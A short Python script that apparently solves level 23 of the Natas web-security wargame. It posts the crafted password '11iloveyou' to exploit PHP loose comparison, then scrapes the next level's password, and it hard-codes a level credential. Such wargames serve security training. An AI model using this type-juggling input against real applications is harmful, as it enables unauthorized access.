# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep
import requests

def natas23():
    username="natas23"
    password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
    data = {"passwd":"11iloveyou"}
    content = post_page(23, username, password, data=data)
    password = re.search(r"(?<=Password: )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))
    

if __name__ == "__main__":
    natas23()